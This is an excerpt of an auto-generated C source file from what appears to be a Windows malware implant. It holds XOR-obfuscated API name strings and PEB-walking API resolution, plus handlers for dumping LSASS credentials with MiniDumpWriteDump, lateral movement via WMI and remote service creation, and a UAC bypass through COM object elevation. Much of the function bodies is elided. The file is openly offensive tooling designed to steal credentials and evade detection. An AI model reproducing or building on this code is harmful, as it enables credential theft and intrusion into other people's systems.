/* AUTO-GENERATED by gen_obf.py — DO NOT EDIT. Source: handlers_lateral.c */
...
static const unsigned char _e_68dd33[] = { 0xFB, 0xBD, 0x89, 0x9E, 0x9E, 0xB7, 0x92, 0x99, 0x89, 0x9A, 0x89, 0x82, 0xFB }; /* obf:'FreeLibrary' */
static const unsigned char _e_423a41[] = { 0x9B, 0xFF, 0xF9, 0xFC, 0xF3, 0xFE, 0xF7, 0xEB, 0xB5, 0xFF, 0xF7, 0xF7, 0x9B }; /* obf:'dbghelp.dll' */
static const unsigned char _e_c084f8[] = { 0x89, 0xC4, 0xE0, 0xE7, 0xE0, 0xCD, 0xFC, 0xE4, 0xF9, 0xDE, 0xFB, 0xE0, 0xFD, 0xEC, 0xCD, 0xFC, 0xE4, 0xF9, 0x89 }; /* obf:'MiniDumpWriteDump' */
static const unsigned char _e_087dcb[] = { 0x9B, 0xD8, 0xF4, 0xD2, 0xF5, 0xF2, 0xEF, 0xF2, 0xFA, 0xF7, 0xF2, 0xE1, 0xFE, 0xDE, 0xE3, 0x9B }; /* obf:'CoInitializeEx' */
static const unsigned char _e_45cee0[] = { 0xBF, 0xFC, 0xD0, 0xEA, 0xD1, 0xD6, 0xD1, 0xD6, 0xCB, 0xD6, 0xDE, 0xD3, 0xD6, 0xC5, 0xDA, 0xBF }; /* obf:'CoUninitialize' */
static const unsigned char _e_f76c4b[] = { 0x81, 0xC2, 0xEE, 0xC8, 0xEF, 0xE8, 0xF5, 0xE8, 0xE0, 0xED, 0xE8, 0xFB, 0xE4, 0xD2, 0xE4, 0xE2, 0xF4, 0xF3, 0xE8, 0xF5, 0xF8, 0x81 }; /* obf:'CoInitializeSecurity' */
static const unsigned char _e_7e5322[] = { 0x15, 0x56, 0x7A, 0x56, 0x67, 0x70, 0x74, 0x61, 0x70, 0x5C, 0x7B, 0x66, 0x61, 0x74, 0x7B, 0x76, 0x70, 0x15 }; /* obf:'CoCreateInstance' */
static const unsigned char _e_5acf60[] = { 0x21, 0x62, 0x4E, 0x72, 0x44, 0x55, 0x71, 0x53, 0x4E, 0x59, 0x58, 0x63, 0x4D, 0x40, 0x4F, 0x4A, 0x44, 0x55, 0x21 }; /* obf:'CoSetProxyBlanket' */
static const unsigned char _e_44feaa[] = { 0x8F, 0xDC, 0xF6, 0xFC, 0xCE, 0xE3, 0xE3, 0xE0, 0xEC, 0xDC, 0xFB, 0xFD, 0xE6, 0xE1, 0xE8, 0x8F }; /* obf:'SysAllocString' */
static const unsigned char _e_578776[] = { 0xC9, 0x9A, 0xB0, 0xBA, 0x8F, 0xBB, 0xAC, 0xAC, 0x9A, 0xBD, 0xBB, 0xA0, 0xA7, 0xAE, 0xC9 }; /* obf:'SysFreeString' */
static const unsigned char _e_ea7cc3[] = { 0x71, 0x3E, 0x01, 0x14, 0x1F, 0x22, 0x32, 0x3C, 0x10, 0x1F, 0x10, 0x16, 0x14, 0x03, 0x30, 0x71 }; /* obf:'OpenSCManagerA' */
static const unsigned char _e_a11d53[] = { 0xBB, 0xF8, 0xC9, 0xDE, 0xDA, 0xCF, 0xDE, 0xE8, 0xDE, 0xC9, 0xCD, 0xD2, 0xD8, 0xDE, 0xFA, 0xBB }; /* obf:'CreateServiceA' */
static const unsigned char _e_1aba3e[] = { 0x1B, 0x48, 0x6F, 0x7A, 0x69, 0x6F, 0x48, 0x7E, 0x69, 0x6D, 0x72, 0x78, 0x7E, 0x5A, 0x1B }; /* obf:'StartServiceA' */
static const unsigned char _e_7a1512[] = { 0x63, 0x27, 0x06, 0x0F, 0x06, 0x17, 0x06, 0x30, 0x06, 0x11, 0x15, 0x0A, 0x00, 0x06, 0x63 }; /* obf:'DeleteService' */
static const unsigned char _e_9604c0[] = { 0x09, 0x4A, 0x65, 0x66, 0x7A, 0x6C, 0x5A, 0x6C, 0x7B, 0x7F, 0x60, 0x6A, 0x6C, 0x41, 0x68, 0x67, 0x6D, 0x65, 0x6C, 0x09 }; /* obf:'CloseServiceHandle' */
static const unsigned char _e_ab37ca[] = { 0x59, 0x1A, 0x36, 0x10, 0x37, 0x30, 0x2D, 0x30, 0x38, 0x35, 0x30, 0x23, 0x3C, 0x59 }; /* obf:'CoInitialize' */
static const unsigned char _e_594dfc[] = { 0x8B, 0xC8, 0xE4, 0xCC, 0xEE, 0xFF, 0xC4, 0xE9, 0xE1, 0xEE, 0xE8, 0xFF, 0x8B }; /* obf:'CoGetObject' */
static const unsigned char _e_e23762[] = { 0x59, 0x38, 0x3D, 0x2F, 0x38, 0x29, 0x30, 0x6A, 0x6B, 0x77, 0x3D, 0x35, 0x35, 0x59 }; /* obf:'advapi32.dll' */
/* ── end XOR blobs ── */
...
{
    PVOID hKernel32 = peb_get_module(peb_hash_str(OBF_S(_e_eb1ec7, 13)));
    if (!hKernel32) return;
    typedef BOOL (WINAPI *pfnFreeLibrary_t)(HMODULE);
    pfnFreeLibrary_t pfnFree =
        (pfnFreeLibrary_t)peb_get_export(hKernel32, peb_hash_str(OBF_S(_e_68dd33, 12)));
...
static BOOL _dump_lsass_minidump(DWORD lsassPid, const char *outPath)
{
    ...
    PVOID hDbg = peb_get_module(peb_hash_str(OBF_S(_e_423a41, 12)));
    BOOL  ownLoad = FALSE;
    if (!hDbg) {
        hDbg = _peb_load_library(OBF_S(_e_423a41, 12));
        ownLoad = (hDbg != NULL);
    }
    ...
    MiniDump_t pDump = (MiniDump_t)peb_get_export(hDbg,
                            peb_hash_str(OBF_S(_e_c084f8, 18)));
...
void _handle_lateral_wmi(TLS_CONTEXT *pTls, const char *args)
{
    ...
    CoInitializeEx_t       pCoInit  = (CoInitializeEx_t)      peb_get_export(hOle32,    peb_hash_str(OBF_S(_e_087dcb, 15)));
    CoUninitialize_t       pCoUninit= (CoUninitialize_t)      peb_get_export(hOle32,    peb_hash_str(OBF_S(_e_45cee0, 15)));
    CoInitializeSecurity_t pCoSec   = (CoInitializeSecurity_t)peb_get_export(hOle32,    peb_hash_str(OBF_S(_e_f76c4b, 21)));
    CoCreateInstance_t     pCoCrInst= (CoCreateInstance_t)    peb_get_export(hOle32,    peb_hash_str(OBF_S(_e_7e5322, 17)));
    CoSetProxyBlanket_t    pCoProxy = (CoSetProxyBlanket_t)   peb_get_export(hOle32,    peb_hash_str(OBF_S(_e_5acf60, 18)));
    SysAllocString_t       pSysAlloc= (SysAllocString_t)      peb_get_export(hOleAut32, peb_hash_str(OBF_S(_e_44feaa, 15)));
    SysFreeString_t        pSysFree = (SysFreeString_t)       peb_get_export(hOleAut32, peb_hash_str(OBF_S(_e_578776, 14)));
...
void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
{
    ...
    PVOID hAdv = _peb_load_library(OBF_S(_e_e23762, 13));
    if (!hAdv) {
    ...
    OpenSCManagerA_t    pOpenSCM  = (OpenSCManagerA_t)   peb_get_export(hAdv, peb_hash_str(OBF_S(_e_ea7cc3, 15)));
    CreateServiceA_t    pCreateSvc= (CreateServiceA_t)   peb_get_export(hAdv, peb_hash_str(OBF_S(_e_a11d53, 15)));
    StartServiceA_t     pStartSvc = (StartServiceA_t)    peb_get_export(hAdv, peb_hash_str(OBF_S(_e_1aba3e, 14)));
    DeleteService_t     pDeleteSvc= (DeleteService_t)    peb_get_export(hAdv, peb_hash_str(OBF_S(_e_7a1512, 14)));
    CloseServiceHandle_t pCloseH  = (CloseServiceHandle_t)peb_get_export(hAdv, peb_hash_str(OBF_S(_e_9604c0, 19)));
...
#define DLL_FILE_SIZE   0x800
    ...
    id[3] = 0x3040;  /* Name RVA OBF_S(_e_eb1ec7, 13) */
    ...
    memcpy(idata + 0x40, OBF_S(_e_eb1ec7, 13), 13);
...
void _handle_uac_com_hijack(TLS_CONTEXT *pTls, const char *args)
{
    ...
    pfnCoInit_t      pfnCoInit =
        (pfnCoInit_t)     peb_get_export(hOle32, peb_hash_str(OBF_S(_e_ab37ca, 13)));
    pfnCoCreateInst_t pfnCoCI  =
        (pfnCoCreateInst_t)peb_get_export(hOle32, peb_hash_str(OBF_S(_e_7e5322, 17)));
    pfnCoUninit_t    pfnCoUninit =
        (pfnCoUninit_t)   peb_get_export(hOle32, peb_hash_str(OBF_S(_e_45cee0, 15)));
    ...
    pfnCoGetObject_t pfnCoGetObject =
        (pfnCoGetObject_t)peb_get_export(hOle32, peb_hash_str(OBF_S(_e_594dfc, 12)));
    if (!pfnCoGetObject) {
        pfnCoUninit();
        _peb_free_library(hOle32);
...
#pragma pack(pop)
    ...
    memcpy(idatae+0x40, OBF_S(_e_eb1ec7, 13), 13);
